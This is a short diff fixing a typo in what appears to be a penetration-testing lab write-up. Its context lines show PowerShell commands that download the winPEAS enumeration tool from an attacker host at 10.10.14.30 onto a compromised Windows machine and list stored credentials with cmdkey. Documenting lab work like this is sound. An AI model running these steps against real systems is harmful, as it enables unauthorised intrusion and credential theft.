@@ -356,7 +356,7 @@ PS C:\Windows\Temp> $url = 'http://10.10.14.30:8000/winPEAS.exe'
 PS C:\Windows\Temp> $path = '.\winPEAS.exe'
 PS C:\Windows\Temp> $client.DownloadFile($url, $path)
 ```
-It doesn't work, however, as group policy seems to prevent this accout from running exe files.  
+It doesn't work, however, as group policy seems to prevent this account from running exe files.  
 List stored creds:
 ```shell
 PS C:\> cmdkey /list
